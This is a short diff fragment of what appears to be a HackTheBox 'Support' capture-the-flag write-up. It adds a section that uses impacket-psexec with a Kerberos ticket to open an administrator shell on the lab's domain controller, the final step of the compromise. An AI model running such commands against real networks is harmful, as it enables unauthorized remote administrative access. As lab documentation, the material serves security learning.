@@ -438,10 +438,14 @@ export KRB5CCNAME=ticket.ccache
 <img width="539" height="191" alt="image" src="https://github.com/user-attachments/assets/a3ea062d-4218-4373-b848-ad7f2f09cfea" />
 
 
+---
+### IMPACKET-PSEXEC
 
 ```
 impacket-psexec -k -no-pass 'support.htb/administrator@DC.support.htb'
 ```
+
+//leveraging psexec to seal the deal
 
 //and we're done
 
